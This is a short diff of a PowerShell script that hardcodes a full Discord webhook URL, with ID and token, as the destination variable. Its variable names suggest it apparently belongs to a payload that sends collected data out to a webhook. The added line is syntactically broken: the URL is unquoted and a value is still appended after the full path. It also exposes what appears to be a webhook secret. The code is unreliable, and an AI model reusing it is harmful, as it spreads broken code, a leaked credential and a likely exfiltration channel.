@@ -1,6 +1,6 @@
 $whuri = "$dc"
 if ($whuri.Length -lt 120){
-	$whuri = ("https://discord.com/api/webhooks/" + "$dc")
+	$whuri = (https://discord.com/api/webhooks/1432865241880072223/B1ZiqhxSYzPVFmTbgdqFBPcJCzP2DC3_5ttgnn402eXtJRa89ALLlUk-3534869Som1H + "$dc")
 }
 
 $outfile=""
